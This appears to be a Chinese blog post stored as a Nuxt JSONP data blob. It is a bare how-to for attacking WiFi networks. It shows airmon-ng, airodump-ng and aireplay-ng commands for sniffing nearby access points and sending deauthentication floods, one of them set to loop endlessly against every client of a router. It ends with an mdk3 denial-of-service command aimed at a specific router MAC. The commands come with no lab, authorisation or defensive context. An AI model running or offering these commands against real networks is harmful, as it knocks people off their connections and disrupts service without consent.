__NUXT_JSONP__("/post/373", {data:[{article:"\u003C!--markdown--\u003E## 1. 查看网卡\n\u003Cpre\u003E\u003Ccode\u003Eifconfig\n\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Ch2 id=\"2-打开网卡混杂模式\"\u003E2. 打开网卡混杂模式\u003C\u002Fh2\u003E\n\u003Cpre\u003E\u003Ccode\u003Eairmon-ng start wlan0\n\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Ch2 id=\"3-嗅探附近ap\"\u003E3. 嗅探附近AP\u003C\u002Fh2\u003E\n\u003Cpre\u003E\u003Ccode\u003Eairodump-ng wlan0mon\n\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Ch2 id=\"4-发动deauth攻击使目标重连\"\u003E4. 发动deauth攻击使目标重连\u003C\u002Fh2\u003E\n\u003Cpre\u003E\u003Ccode\u003Eaireplay-ng -0 [攻击数量] –a [路由器MAC] -c [客户端MAC] wlan0mon\n\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Col\u003E\n\u003Cli\u003E攻击数量设为0为无限循环模式\u003C\u002Fli\u003E\n\u003Cli\u003E路口器MAC地址为必填项\u003C\u002Fli\u003E\n\u003Cli\u003E客户端MAC，可不填则对路由器所有的客户端进行攻击\u003Ch2 id=\"5-对路由器dos攻击\"\u003E5. 对路由器Dos攻击\u003C\u002Fh2\u003E\n\u003Cpre\u003E\u003Ccode\u003Esudo mdk3 mon0 a -a D4:83:04:9F:37:28\n\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003C\u002Fli\u003E\n\u003C\u002Fol\u003E\n"}],fetch:{},mutations:void 0});